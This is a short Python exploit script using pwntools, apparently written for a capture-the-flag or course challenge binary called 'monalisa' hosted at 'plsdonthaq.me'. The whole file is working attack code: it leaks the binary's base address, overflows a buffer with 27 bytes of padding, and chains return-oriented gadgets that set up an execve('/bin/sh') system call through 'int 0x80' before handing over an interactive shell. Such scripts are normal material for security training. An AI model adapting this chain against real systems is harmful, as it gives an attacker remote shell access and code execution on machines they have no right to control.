from pwn import *

PROGNAME = "./monalisa"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 2

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    e = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    e = p.elf

gadget = lambda x: p32(next(e.search(asm(x, os='linux', arch=e.arch))))

#Leak main addr
p.recvuntil("0x")
leak = int(p.recvline(), 16) - e.symbols["functions_go_brrrr"]
e.address = leak
log.info("Base is 0x%x" % e.address)

p.recvuntil("roproprop...")

# roproprop
payload = 27 * b"A"
payload += gadget("xor ecx, ecx; ret")
payload += gadget("mov eax, 0; mov edx, 0; ret")

payload += gadget("pop ebx; ret") + p32(next(e.search(b"/bin/sh")))

payload += gadget("add eax, 1; ret") * 0xb

payload += gadget("int 0x80; ret;")
p.sendline(payload)
p.interactive()
